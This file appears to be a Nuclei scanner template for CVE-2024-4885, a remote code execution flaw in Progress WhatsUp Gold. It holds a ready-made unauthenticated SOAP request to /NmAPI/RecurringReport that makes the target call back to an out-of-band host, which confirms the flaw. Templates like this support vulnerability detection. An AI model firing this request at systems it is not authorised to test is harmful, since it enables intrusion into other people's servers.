folder-7/poc-yaml-progress-software-whatsup-gold-rce-cve-2024-4885.yaml

id: cve-2024-4885
info:
  name: Progress Software WhatsUp Gold RCE (CVE-2024-4885)
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce,dns,oast,cve

dns:
  - name: dns-log
    type: A
    class: inet
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns

variables:
  reverse: '{{interactsh-url}}'

flow: |
  http(1) && dns(0)

http:
  - id: initial-check
    method: GET
    path:
      - "{{BaseURL}}/NmConsole/User/LogIn?AspxAutoDetectCookieSupport=1"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "WhatsUp Gold"
      - type: status
        status:
          - 200

  - id: exploit-attempt
    method: POST
    path:
      - "{{BaseURL}}/NmAPI/RecurringReport"
    headers:
      Content-Type: text/xml; charset=utf-8
      SOAPAction: "http://tempuri.org/IRecurringReportServices/TestRecurringReport"
    body: |-
      <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><TestRecurringReport xmlns="http://tempuri.org/"><rr xmlns:a="http://schemas.datacontract.org/2004/07/WUGDataAccess.RecurringReports.DataContracts" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><a:URL>{"title":"foo","renderType":"aspx","reports":[{"title":"thetitle","url":"/NmConsole/api/Wireless/ReportWirelessLog","dateRangeFilter":{"label":"Date Range","n":0,"range":"Today","text":"Today"},"severityFilter":{"label":"Severity","value":-1,"text":"ALL"},"limit":50,"grid":{"emptyText":"[ No records found ]","columns":[{"dataIndex":"Date","text":"Date","flex":1},{"dataIndex":"Severity","text":"Severity","flex":1},{"dataIndex":"Message","text":"Message","flex":1}],"filters":[],"sorters":[]}}],"baseUrl":"http://{{reverse}}","userId":1}</a:URL><a:WebUserID>1</a:WebUserID><a:WebUserName>admin</a:WebUserName></rr></TestRecurringReport></s:Body></s:Envelope>
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns
